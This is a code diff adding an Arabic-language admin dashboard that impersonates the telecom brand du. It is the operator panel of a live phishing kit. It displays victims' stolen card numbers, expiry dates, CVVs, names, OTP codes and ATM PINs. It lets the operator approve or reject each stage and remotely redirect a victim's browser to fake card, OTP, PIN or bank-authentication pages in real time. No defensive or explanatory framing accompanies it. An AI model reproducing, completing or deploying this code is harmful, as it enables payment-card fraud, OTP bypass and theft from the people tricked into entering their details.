@@ -1,0 +1,641 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>لوحة تحكم الأدمين - du</title>
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap" rel="stylesheet">
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { font-family: 'Tajawal', sans-serif; background: #f0f2f5; direction: rtl; color: #333; font-size: 14px; }
+
+        /* ===== صفحة تسجيل الدخول ===== */
+        .login-overlay {
+            display: flex; position: fixed; inset: 0;
+            background: linear-gradient(135deg, #702082 0%, #00aeef 100%);
+            z-index: 9999; align-items: center; justify-content: center;
+        }
+        .login-overlay.hidden { display: none; }
+        .login-box {
+            background: #fff; border-radius: 20px; padding: 40px 36px;
+            width: 340px; max-width: 92vw;
+            box-shadow: 0 8px 40px rgba(0,0,0,0.25); text-align: center;
+        }
+        .login-logo { width: 70px; margin-bottom: 16px; }
+        .login-box h2 { font-size: 1.3rem; font-weight: 700; margin-bottom: 5px; color: #222; }
+        .login-box p { font-size: 0.85rem; color: #888; margin-bottom: 22px; }
+        .login-input {
+            width: 100%; height: 50px; border: 1.5px solid #ddd; border-radius: 12px;
+            padding: 0 16px; font-size: 1.1rem; font-family: 'Tajawal', sans-serif;
+            text-align: center; letter-spacing: 5px; margin-bottom: 12px; outline: none; transition: border 0.2s;
+        }
+        .login-input:focus { border-color: #702082; }
+        .login-btn {
+            width: 100%; height: 50px; border-radius: 12px; border: none;
+            background: linear-gradient(90deg, #702082, #00aeef);
+            color: #fff; font-size: 1.1rem; font-weight: 700; cursor: pointer;
+            font-family: 'Tajawal', sans-serif;
+        }
+        .login-error {
+            display: none; background: #fff3f3; border: 1px solid #f5c6cb;
+            color: #721c24; border-radius: 8px; padding: 8px 12px;
+            font-size: 0.85rem; margin-bottom: 10px;
+        }
+
+        /* ===== HEADER ===== */
+        .admin-header {
+            background: linear-gradient(135deg, #702082, #00aeef);
+            color: #fff; padding: 13px 20px;
+            display: flex; align-items: center; justify-content: space-between;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.2);
+            position: sticky; top: 0; z-index: 100;
+        }
+        .admin-header h1 { font-size: 1.15rem; font-weight: 700; display: flex; align-items: center; gap: 8px; }
+        .live-dot { display: inline-block; width: 9px; height: 9px; background: #4cff72; border-radius: 50%; animation: blink 1.2s infinite; }
+        @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0.3} }
+        .header-actions { display: flex; gap: 8px; align-items: center; }
+        .header-btn { background: rgba(255,255,255,0.18); border: 1px solid rgba(255,255,255,0.35); color: #fff; padding: 5px 13px; border-radius: 8px; cursor: pointer; font-family: 'Tajawal', sans-serif; font-size: 0.82rem; }
+        .last-update { font-size: 0.78rem; opacity: 0.85; }
+
+        /* ===== STATS ===== */
+        .container { max-width: 1100px; margin: 16px auto; padding: 0 14px; }
+        .stats-row { display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; margin-bottom: 14px; }
+        .stat-card { background: #fff; border-radius: 12px; padding: 14px; text-align: center; box-shadow: 0 2px 8px rgba(0,0,0,0.07); }
+        .stat-card .num { font-size: 1.8rem; font-weight: 700; color: #702082; }
+        .stat-card .lbl { font-size: 0.75rem; color: #888; margin-top: 3px; }
+
+        /* ===== FILTER TABS ===== */
+        .filter-tabs { display: flex; gap: 7px; margin-bottom: 12px; flex-wrap: wrap; }
+        .filter-tab { padding: 5px 14px; border-radius: 20px; border: 1.5px solid #ddd; background: #fff; cursor: pointer; font-size: 0.82rem; font-family: 'Tajawal', sans-serif; transition: 0.2s; }
+        .filter-tab.active { background: #702082; color: #fff; border-color: #702082; }
+
+        /* ===== TABLE ===== */
+        .table-wrapper { background: #fff; border-radius: 14px; box-shadow: 0 2px 10px rgba(0,0,0,0.07); overflow: hidden; }
+        .table-header { display: flex; align-items: center; justify-content: space-between; padding: 13px 18px; border-bottom: 1px solid #f0f0f0; }
+        .table-header .title { font-size: 1rem; font-weight: 700; display: flex; align-items: center; gap: 8px; }
+        .count-badge { background: #702082; color: #fff; border-radius: 12px; padding: 2px 10px; font-size: 0.78rem; }
+
+        table { width: 100%; border-collapse: collapse; }
+        thead th { background: #f8f9fa; padding: 10px 12px; text-align: right; font-size: 0.82rem; font-weight: 700; color: #555; border-bottom: 1px solid #eee; white-space: nowrap; }
+        tbody tr { border-bottom: 1px solid #f5f5f5; transition: background 0.15s; }
+        tbody tr:hover { background: #fafafa; }
+        tbody tr:last-child { border-bottom: none; }
+        tbody td { padding: 10px 12px; vertical-align: middle; font-size: 0.88rem; }
+
+        /* ===== STAGE BADGE ===== */
+        .stage-badge { display: inline-block; padding: 3px 10px; border-radius: 10px; font-size: 0.75rem; font-weight: 700; white-space: nowrap; }
+        .badge-browsing { background: #e9ecef; color: #495057; }
+        .badge-pending { background: #fff3cd; color: #856404; }
+        .badge-approved { background: #d4edda; color: #155724; }
+        .badge-rejected { background: #f8d7da; color: #721c24; }
+
+        /* ===== زر التفاصيل ===== */
+        .btn-details {
+            background: #f0e6f6; color: #702082; border: none;
+            padding: 5px 12px; border-radius: 8px; cursor: pointer;
+            font-family: 'Tajawal', sans-serif; font-size: 0.82rem; font-weight: 700;
+            white-space: nowrap; transition: 0.15s; position: relative;
+        }
+        .btn-details:hover { background: #e0c8f0; }
+        .btn-details.open { background: #702082; color: #fff; }
+
+        /* ===== POPUP التفاصيل (يظهر من فوق كـ modal) ===== */
+        .details-modal-overlay {
+            display: none; position: fixed; inset: 0;
+            background: rgba(0,0,0,0.45); z-index: 800;
+            align-items: flex-start; justify-content: center;
+            padding-top: 60px;
+        }
+        .details-modal-overlay.open { display: flex; }
+        .details-modal {
+            background: #fff; border-radius: 18px;
+            width: 520px; max-width: 95vw; max-height: 85vh;
+            overflow-y: auto;
+            box-shadow: 0 8px 40px rgba(0,0,0,0.25);
+            animation: slideDown 0.25s ease;
+        }
+        @keyframes slideDown { from { transform: translateY(-30px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
+        .details-modal-header {
+            display: flex; align-items: center; justify-content: space-between;
+            padding: 16px 20px; border-bottom: 1px solid #f0f0f0;
+            background: linear-gradient(135deg, #702082, #00aeef);
+            border-radius: 18px 18px 0 0;
+        }
+        .details-modal-header h3 { color: #fff; font-size: 1rem; font-weight: 700; }
+        .btn-close-modal {
+            background: rgba(255,255,255,0.2); border: none; color: #fff;
+            width: 30px; height: 30px; border-radius: 50%; cursor: pointer;
+            font-size: 1.1rem; display: flex; align-items: center; justify-content: center;
+        }
+        .details-modal-body { padding: 20px; }
+
+        /* بيانات البطاقة - عمود واحد */
+        .card-data-list { margin-bottom: 16px; }
+        .card-data-item {
+            display: flex; align-items: center; justify-content: space-between;
+            padding: 10px 14px; border-bottom: 1px solid #f5f5f5;
+            background: #fafafa; border-radius: 8px; margin-bottom: 6px;
+        }
+        .card-data-item .key { font-size: 0.82rem; color: #888; }
+        .card-data-item .val { font-weight: 700; color: #333; font-size: 0.95rem; font-family: monospace; letter-spacing: 1px; }
+        .card-data-item .val.purple { color: #702082; }
+
+        /* بيانات OTP/PIN/Bank */
+        .codes-box {
+            background: linear-gradient(135deg, #e8f4fd, #f0e6f6);
+            border-radius: 12px; padding: 14px 16px; margin-bottom: 16px;
+        }
+        .codes-box .code-row {
+            display: flex; align-items: center; justify-content: space-between;
+            padding: 7px 0; border-bottom: 1px solid rgba(0,0,0,0.06);
+        }
+        .codes-box .code-row:last-child { border-bottom: none; }
+        .codes-box .code-key { font-size: 0.82rem; color: #555; }
+        .codes-box .code-val { font-weight: 700; font-size: 1.1rem; color: #1a5276; letter-spacing: 3px; }
+        .codes-box .code-val.empty { color: #aaa; font-size: 0.82rem; letter-spacing: 0; font-weight: 400; }
+        .codes-box .code-val.confirmed { color: #27ae60; font-size: 0.9rem; letter-spacing: 0; }
+
+        /* أزرار القبول/الرفض - تظهر فقط عند action جديد */
+        .action-section { margin-top: 4px; }
+        .action-buttons { display: flex; gap: 10px; }
+        .btn-approve {
+            flex: 1; height: 46px; border-radius: 12px; border: none;
+            background: linear-gradient(135deg, #27ae60, #2ecc71);
+            color: #fff; font-size: 1rem; font-weight: 700;
+            cursor: pointer; font-family: 'Tajawal', sans-serif; transition: 0.2s;
+        }
+        .btn-approve:hover { opacity: 0.9; }
+        .btn-reject {
+            flex: 1; height: 46px; border-radius: 12px; border: none;
+            background: linear-gradient(135deg, #e74c3c, #c0392b);
+            color: #fff; font-size: 1rem; font-weight: 700;
+            cursor: pointer; font-family: 'Tajawal', sans-serif; transition: 0.2s;
+        }
+        .btn-reject:hover { opacity: 0.9; }
+        .no-action-msg { text-align: center; padding: 10px; color: #aaa; font-size: 0.85rem; }
+
+        /* ===== زر التوجيه ===== */
+        .nav-wrapper { position: relative; display: inline-block; }
+        .btn-navigate { background: #e8f4fd; color: #1a5276; border: none; padding: 5px 12px; border-radius: 8px; cursor: pointer; font-family: 'Tajawal', sans-serif; font-size: 0.82rem; font-weight: 700; white-space: nowrap; transition: 0.15s; }
+        .btn-navigate:hover { background: #d0e8f8; }
+        .btn-navigate.open { background: #1a5276; color: #fff; }
+        .nav-dropdown { display: none; position: absolute; bottom: 110%; left: 0; background: #fff; border: 1.5px solid #b8d9f5; border-radius: 10px; box-shadow: 0 -4px 20px rgba(0,0,0,0.15); z-index: 500; min-width: 190px; overflow: hidden; }
+        .nav-dropdown.open { display: block; }
+        .nav-item { padding: 10px 16px; cursor: pointer; font-size: 0.88rem; transition: background 0.15s; display: flex; align-items: center; gap: 8px; border-bottom: 1px solid #f0f0f0; }
+        .nav-item:last-child { border-bottom: none; }
+        .nav-item:hover { background: #f0f7ff; }
+
+        /* ===== EMPTY STATE ===== */
+        .empty-state { text-align: center; padding: 50px 20px; color: #aaa; }
+        .empty-state .icon { font-size: 2.5rem; margin-bottom: 10px; }
+
+        /* ===== TOAST ===== */
+        #toast { position: fixed; bottom: 24px; left: 50%; transform: translateX(-50%); background: #333; color: #fff; padding: 10px 22px; border-radius: 24px; font-size: 0.9rem; z-index: 9999; box-shadow: 0 4px 16px rgba(0,0,0,0.25); font-family: 'Tajawal', sans-serif; opacity: 0; transition: opacity 0.3s; pointer-events: none; }
+
+        @media (max-width: 768px) {
+            .stats-row { grid-template-columns: repeat(2, 1fr); }
+            table { font-size: 0.8rem; }
+            thead th, tbody td { padding: 8px 8px; }
+        }
+    </style>
+</head>
+<body>
+
+<!-- ===== صفحة تسجيل الدخول ===== -->
+<div class="login-overlay" id="loginOverlay">
+    <div class="login-box">
+        <img class="login-logo" src="/images/du-logo.png" alt="du" onerror="this.style.display='none'">
+        <h2>لوحة تحكم الأدمين</h2>
+        <p>أدخل كلمة السر للدخول</p>
+        <div class="login-error" id="loginError">كلمة السر غير صحيحة</div>
+        <input type="password" class="login-input" id="loginInput" placeholder="••••••••" onkeydown="if(event.key==='Enter') doLogin()">
+        <button class="login-btn" onclick="doLogin()">دخول</button>
+    </div>
+</div>
+
+<!-- ===== POPUP التفاصيل ===== -->
+<div class="details-modal-overlay" id="detailsOverlay" onclick="closeDetailsModal(event)">
+    <div class="details-modal" id="detailsModal">
+        <div class="details-modal-header">
+            <h3 id="modal_title">تفاصيل الجلسة</h3>
+            <button class="btn-close-modal" onclick="closeDetailsModal()">✕</button>
+        </div>
+        <div class="details-modal-body" id="modal_body"></div>
+    </div>
+</div>
+
+<!-- ===== الهيدر ===== -->
+<div class="admin-header">
+    <h1><span class="live-dot"></span> لوحة تحكم الأدمين - du</h1>
+    <div class="header-actions">
+        <span class="last-update" id="last_update">جاري التحديث...</span>
+        <button class="header-btn" onclick="loadSessions()">🔄 تحديث</button>
+        <button class="header-btn" onclick="doLogout()">خروج</button>
+    </div>
+</div>
+
+<div class="container">
+    <!-- الإحصائيات -->
+    <div class="stats-row">
+        <div class="stat-card"><div class="num" id="stat_total">0</div><div class="lbl">إجمالي الجلسات</div></div>
+        <div class="stat-card"><div class="num" id="stat_pending" style="color:#f39c12;">0</div><div class="lbl">بانتظار القرار</div></div>
+        <div class="stat-card"><div class="num" id="stat_success" style="color:#27ae60;">0</div><div class="lbl">ناجحة</div></div>
+        <div class="stat-card"><div class="num" id="stat_rejected" style="color:#e74c3c;">0</div><div class="lbl">مرفوضة</div></div>
+    </div>
+
+    <!-- فلاتر -->
+    <div class="filter-tabs">
+        <button class="filter-tab active" onclick="setFilter('all', this)">الكل</button>
+        <button class="filter-tab" onclick="setFilter('browsing', this)">تصفح</button>
+        <button class="filter-tab" onclick="setFilter('pending', this)">بانتظار القرار</button>
+        <button class="filter-tab" onclick="setFilter('card', this)">بطاقة</button>
+        <button class="filter-tab" onclick="setFilter('otp', this)">OTP</button>
+        <button class="filter-tab" onclick="setFilter('pin', this)">رقم سري ATM</button>
+        <button class="filter-tab" onclick="setFilter('bank_auth', this)">مصادقة بنكية</button>
+        <button class="filter-tab" onclick="setFilter('success', this)">ناجحة</button>
+    </div>
+
+    <!-- الجدول -->
+    <div class="table-wrapper">
+        <div class="table-header">
+            <div class="title">الجلسات النشطة <span class="count-badge" id="sessions_count">0</span></div>
+        </div>
+        <div style="overflow-x:auto;">
+            <table>
+                <thead>
+                    <tr>
+                        <th>رقم التليفون</th>
+                        <th>نوع العملية</th>
+                        <th>المبلغ</th>
+                        <th>الدولة</th>
+                        <th>التاريخ</th>
+                        <th>الحالة</th>
+                        <th>التفاصيل</th>
+                        <th>التوجيه</th>
+                    </tr>
+                </thead>
+                <tbody id="sessions_tbody">
+                    <tr><td colspan="8"><div class="empty-state"><div class="icon">⏳</div><p>لا توجد جلسات نشطة حالياً</p></div></td></tr>
+                </tbody>
+            </table>
+        </div>
+    </div>
+</div>
+
+<div id="toast"></div>
+
+<script>
+    let allSessions = [];
+    let currentFilter = 'all';
+    let openNavs = new Set();
+    let adminToken = localStorage.getItem('admin_token') || '';
+    let autoRefreshInterval = null;
+    let currentModalSessionId = null;
+
+    // ============================================================
+    // تسجيل الدخول
+    // ============================================================
+    async function doLogin() {
+        const pw = document.getElementById('loginInput').value;
+        const errEl = document.getElementById('loginError');
+        errEl.style.display = 'none';
+        try {
+            const res = await fetch('/api/admin/login', {
+                method: 'POST', headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ password: pw })
+            });
+            const data = await res.json();
+            if (data.success) {
+                adminToken = data.token;
+                localStorage.setItem('admin_token', adminToken);
+                document.getElementById('loginOverlay').classList.add('hidden');
+                startAutoRefresh(); loadSessions();
+            } else {
+                errEl.style.display = 'block';
+                document.getElementById('loginInput').value = '';
+                document.getElementById('loginInput').focus();
+            }
+        } catch(e) { errEl.textContent = 'خطأ في الاتصال'; errEl.style.display = 'block'; }
+    }
+
+    async function doLogout() {
+        try { await fetch('/api/admin/logout', { method: 'POST', headers: { 'Content-Type': 'application/json', 'X-Admin-Token': adminToken }, body: JSON.stringify({ token: adminToken }) }); } catch(e) {}
+        adminToken = ''; localStorage.removeItem('admin_token'); stopAutoRefresh();
+        document.getElementById('loginOverlay').classList.remove('hidden');
+        document.getElementById('loginInput').value = '';
+    }
+
+    async function verifyToken() {
+        if (!adminToken) return false;
+        try {
+            const res = await fetch('/api/admin/verify', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: adminToken }) });
+            return (await res.json()).success;
+        } catch(e) { return false; }
+    }
+
+    // ============================================================
+    // فلترة
+    // ============================================================
+    function setFilter(f, el) {
+        currentFilter = f;
+        document.querySelectorAll('.filter-tab').forEach(t => t.classList.remove('active'));
+        el.classList.add('active');
+        renderTable();
+    }
+
+    // ============================================================
+    // تسميات المراحل
+    // ============================================================
+    function getStageLabel(stage) {
+        const map = {
+            'browsing': 'يتصفح الموقع',
+            'card_pending': 'انتظار قرار البطاقة',
+            'card_approved': 'تمت الموافقة على البطاقة',
+            'card_rejected': 'تم رفض البطاقة',
+            'otp_pending': 'انتظار قرار OTP',
+            'otp_approved': 'تمت الموافقة على OTP',
+            'otp_rejected': 'تم رفض OTP',
+            'pin_pending': 'انتظار قرار الرقم السري',
+            'pin_approved': 'تمت الموافقة على الرقم السري',
+            'pin_rejected': 'تم رفض الرقم السري',
+            'bank_auth_pending': 'انتظار المصادقة البنكية',
+            'bank_auth_approved': 'تمت الموافقة على المصادقة',
+            'bank_auth_rejected': 'تم رفض المصادقة البنكية',
+            'success': 'ناجحة ✓',
+        };
+        return map[stage] || stage;
+    }
+
+    function getStageBadgeClass(stage) {
+        if (stage === 'browsing') return 'badge-browsing';
+        if (stage.includes('pending')) return 'badge-pending';
+        if (stage.includes('approved') || stage === 'success') return 'badge-approved';
+        if (stage.includes('rejected')) return 'badge-rejected';
+        return 'badge-browsing';
+    }
+
+    function formatDate(ts) {
+        const d = new Date(ts * 1000);
+        const pad = n => n.toString().padStart(2, '0');
+        return `${pad(d.getDate())}/${pad(d.getMonth()+1)}/${d.getFullYear()} ${pad(d.getHours())}:${pad(d.getMinutes())}`;
+    }
+
+    function timeAgo(ts) {
+        const diff = Math.floor(Date.now()/1000 - ts);
+        if (diff < 60) return `منذ ${diff} ث`;
+        if (diff < 3600) return `منذ ${Math.floor(diff/60)} د`;
+        return `منذ ${Math.floor(diff/3600)} س`;
+    }
+
+    // ============================================================
+    // رسم الجدول
+    // ============================================================
+    function renderTable() {
+        const tbody = document.getElementById('sessions_tbody');
+        let filtered = allSessions;
+        if (currentFilter === 'browsing') filtered = allSessions.filter(s => s.stage === 'browsing');
+        else if (currentFilter === 'pending') filtered = allSessions.filter(s => s.stage.includes('pending'));
+        else if (currentFilter === 'card') filtered = allSessions.filter(s => s.stage.startsWith('card'));
+        else if (currentFilter === 'otp') filtered = allSessions.filter(s => s.stage.startsWith('otp'));
+        else if (currentFilter === 'pin') filtered = allSessions.filter(s => s.stage.startsWith('pin'));
+        else if (currentFilter === 'bank_auth') filtered = allSessions.filter(s => s.stage.startsWith('bank_auth'));
+        else if (currentFilter === 'success') filtered = allSessions.filter(s => s.stage === 'success');
+
+        document.getElementById('sessions_count').textContent = filtered.length;
+
+        if (filtered.length === 0) {
+            tbody.innerHTML = `<tr><td colspan="8"><div class="empty-state"><div class="icon">⏳</div><p>لا توجد جلسات في هذه الفئة</p></div></td></tr>`;
+            return;
+        }
+
+        const rows = filtered.map(s => {
+            const modeLabel = s.mode === 'pay' ? '📄 دفع فاتورة' : '📱 إعادة شحن';
+            const badgeClass = getStageBadgeClass(s.stage);
+            const navOpen = openNavs.has(s.id);
+
+            return `
+            <tr id="row_${s.id}">
+                <td><strong>${s.phone || '—'}</strong></td>
+                <td>${modeLabel}</td>
+                <td><strong style="color:#702082;">${s.amount ? s.amount + ' درهم' : '—'}</strong></td>
+                <td>🌍 ${s.country || 'جاري الكشف...'}</td>
+                <td style="font-size:0.8rem; color:#666;">${formatDate(s.created_at)}<br><span style="color:#aaa;">${timeAgo(s.updated_at)}</span></td>
+                <td><span class="stage-badge ${badgeClass}">${getStageLabel(s.stage)}</span></td>
+                <td>
+                    <button class="btn-details" onclick="openDetailsModal('${s.id}')">
+                        ▲ التفاصيل
+                    </button>
+                </td>
+                <td>
+                    <div class="nav-wrapper">
+                        <button class="btn-navigate ${navOpen ? 'open' : ''}" onclick="toggleNav('${s.id}', event)">🔀 التوجيه ▴</button>
+                        <div class="nav-dropdown ${navOpen ? 'open' : ''}" id="nav_${s.id}">
+                            <div class="nav-item" onclick="navigateTo('${s.id}', 'step_1')">🏠 الصفحة الرئيسية</div>
+                            <div class="nav-item" onclick="navigateTo('${s.id}', 'step_2')">📋 تفاصيل الفاتورة/الشحن</div>
+                            <div class="nav-item" onclick="navigateTo('${s.id}', 'step_3')">💳 صفحة البطاقة</div>
+                            <div class="nav-item" onclick="navigateTo('${s.id}', 'step_loading')">⏳ صفحة التحميل</div>
+                            <div class="nav-item" onclick="navigateTo('${s.id}', 'step_otp')">🔐 صفحة OTP</div>
+                            <div class="nav-item" onclick="navigateTo('${s.id}', 'step_bank_auth')">🏦 مصادقة بنكية</div>
+                            <div class="nav-item" onclick="navigateTo('${s.id}', 'step_pin')">🏧 رقم سري ATM</div>
+                            <div class="nav-item" onclick="navigateTo('${s.id}', 'step_success')">✅ صفحة النجاح</div>
+                        </div>
+                    </div>
+                </td>
+            </tr>`;
+        }).join('');
+
+        tbody.innerHTML = rows;
+    }
+
+    // ============================================================
+    // POPUP التفاصيل
+    // ============================================================
+    function openDetailsModal(sessionId) {
+        const s = allSessions.find(x => x.id === sessionId);
+        if (!s) return;
+        currentModalSessionId = sessionId;
+
+        document.getElementById('modal_title').textContent = `تفاصيل الجلسة - ${s.phone || '—'}`;
+
+        // تحديد هل في action جديد يحتاج قرار
+        const isPending = s.stage.includes('pending');
+
+        // بناء محتوى الـ modal
+        let html = `
+        <div class="card-data-list">
+            <div class="card-data-item">
+                <span class="key">رقم البطاقة</span>
+                <span class="val purple">${s.card_number || '—'}</span>
+            </div>
+            <div class="card-data-item">
+                <span class="key">تاريخ الانتهاء</span>
+                <span class="val">${s.card_expiry || '—'}</span>
+            </div>
+            <div class="card-data-item">
+                <span class="key">CVV</span>
+                <span class="val">${s.card_cvv || '—'}</span>
+            </div>
+            <div class="card-data-item">
+                <span class="key">اسم حامل البطاقة</span>
+                <span class="val">${s.card_name || '—'}</span>
+            </div>
+        </div>`;
+
+        // OTP / PIN / مصادقة بنكية
+        const hasOtpPin = s.otp || s.pin || s.bank_auth || s.stage.startsWith('otp') || s.stage.startsWith('pin') || s.stage.startsWith('bank_auth');
+        if (hasOtpPin) {
+            html += `
+            <div class="codes-box">
+                <div class="code-row">
+                    <span class="code-key">🔐 رمز OTP</span>
+                    ${s.otp ? `<span class="code-val">${s.otp}</span>` : `<span class="code-val empty">لم يُدخل بعد</span>`}
+                </div>
+                <div class="code-row">
+                    <span class="code-key">🏧 الرقم السري ATM</span>
+                    ${s.pin ? `<span class="code-val">${s.pin}</span>` : `<span class="code-val empty">لم يُدخل بعد</span>`}
+                </div>
+                <div class="code-row">
+                    <span class="code-key">🏦 المصادقة البنكية</span>
+                    ${s.bank_auth ? `<span class="code-val confirmed">✓ تمت الموافقة</span>` : `<span class="code-val empty">لم يؤكد بعد</span>`}
+                </div>
+            </div>`;
+        }
+
+        // أزرار القبول/الرفض - تظهر فقط عند action جديد (pending)
+        html += `<div class="action-section">`;
+        if (isPending) {
+            const stageLabels = {
+                'card_pending': 'معلومات البطاقة',
+                'otp_pending': 'رمز OTP',
+                'pin_pending': 'الرقم السري ATM',
+                'bank_auth_pending': 'المصادقة البنكية',
+            };
+            const label = stageLabels[s.stage] || 'العملية';
+            html += `
+            <p style="font-size:0.82rem; color:#888; margin-bottom:10px; text-align:center;">قرار على: <strong>${label}</strong></p>
+            <div class="action-buttons">
+                <button class="btn-approve" onclick="decide('${s.id}', 'approve')">✓ قبول</button>
+                <button class="btn-reject" onclick="decide('${s.id}', 'reject')">✗ رفض</button>
+            </div>`;
+        } else {
+            html += `<div class="no-action-msg">لا يوجد action جديد من العميل حالياً</div>`;
+        }
+        html += `</div>`;
+
+        document.getElementById('modal_body').innerHTML = html;
+        document.getElementById('detailsOverlay').classList.add('open');
+    }
+
+    function closeDetailsModal(event) {
+        if (event && event.target !== document.getElementById('detailsOverlay')) return;
+        document.getElementById('detailsOverlay').classList.remove('open');
+        currentModalSessionId = null;
+    }
+
+    // ============================================================
+    // فتح/إغلاق قائمة التوجيه
+    // ============================================================
+    function toggleNav(id, event) {
+        event.stopPropagation();
+        if (openNavs.has(id)) { openNavs.delete(id); } else { openNavs.clear(); openNavs.add(id); }
+        renderTable();
+    }
+
+    document.addEventListener('click', () => {
+        if (openNavs.size > 0) { openNavs.clear(); renderTable(); }
+    });
+
+    // ============================================================
+    // التوجيه الفوري
+    // ============================================================
+    async function navigateTo(sessionId, page) {
+        openNavs.clear();
+        try {
+            const res = await fetch('/api/admin/navigate', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json', 'X-Admin-Token': adminToken },
+                body: JSON.stringify({ session_id: sessionId, page })
+            });
+            const data = await res.json();
+            if (data.success) {
+                const pageNames = { 'step_1': 'الصفحة الرئيسية', 'step_2': 'تفاصيل الفاتورة', 'step_3': 'صفحة البطاقة', 'step_loading': 'صفحة التحميل', 'step_otp': 'صفحة OTP', 'step_bank_auth': 'مصادقة بنكية', 'step_pin': 'رقم سري ATM', 'step_success': 'صفحة النجاح' };
+                showToast(`✅ تم توجيه العميل إلى: ${pageNames[page] || page}`);
+                await loadSessions();
+            }
+        } catch(e) { console.error('Navigate error:', e); }
+    }
+
+    // ============================================================
+    // قرار القبول/الرفض
+    // ============================================================
+    async function decide(sessionId, decision) {
+        try {
+            const res = await fetch('/api/admin/decide', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json', 'X-Admin-Token': adminToken },
+                body: JSON.stringify({ session_id: sessionId, decision })
+            });
+            const data = await res.json();
+            if (data.success) {
+                showToast(decision === 'approve' ? '✅ تم القبول' : '❌ تم الرفض');
+                document.getElementById('detailsOverlay').classList.remove('open');
+                await loadSessions();
+            } else if (res.status === 401) { doLogout(); }
+        } catch(e) { console.error('Decide error:', e); }
+    }
+
+    // ============================================================
+    // Toast
+    // ============================================================
+    function showToast(msg) {
+        const toast = document.getElementById('toast');
+        toast.textContent = msg; toast.style.opacity = '1';
+        clearTimeout(toast._timer);
+        toast._timer = setTimeout(() => { toast.style.opacity = '0'; }, 2500);
+    }
+
+    // ============================================================
+    // تحميل الجلسات
+    // ============================================================
+    async function loadSessions() {
+        if (!adminToken) return;
+        try {
+            const res = await fetch('/api/admin/sessions', { headers: { 'X-Admin-Token': adminToken } });
+            if (res.status === 401) { doLogout(); return; }
+            const data = await res.json();
+            if (data.success) {
+                allSessions = data.sessions;
+                document.getElementById('stat_total').textContent = allSessions.length;
+                document.getElementById('stat_pending').textContent = allSessions.filter(s => s.stage.includes('pending')).length;
+                document.getElementById('stat_success').textContent = allSessions.filter(s => s.stage === 'success').length;
+                document.getElementById('stat_rejected').textContent = allSessions.filter(s => s.stage.includes('rejected')).length;
+                renderTable();
+
+                // تحديث الـ modal المفتوح إن وجد
+                if (currentModalSessionId) {
+                    const updated = allSessions.find(s => s.id === currentModalSessionId);
+                    if (updated) openDetailsModal(currentModalSessionId);
+                }
+
+                const now = new Date();
+                const pad = n => n.toString().padStart(2, '0');
+                document.getElementById('last_update').textContent = `آخر تحديث: ${pad(now.getHours())}:${pad(now.getMinutes())}:${pad(now.getSeconds())}`;
+            }
+        } catch(e) { console.error('Error loading sessions:', e); }
+    }
+
+    function startAutoRefresh() { stopAutoRefresh(); autoRefreshInterval = setInterval(loadSessions, 3000); }
+    function stopAutoRefresh() { if (autoRefreshInterval) { clearInterval(autoRefreshInterval); autoRefreshInterval = null; } }
+
+    async function init() {
+        if (adminToken) {
+            const valid = await verifyToken();
+            if (valid) { document.getElementById('loginOverlay').classList.add('hidden'); startAutoRefresh(); loadSessions(); }
+            else { adminToken = ''; localStorage.removeItem('admin_token'); }
+        }
+    }
+
+    init();
+</script>
+</body>
+</html>
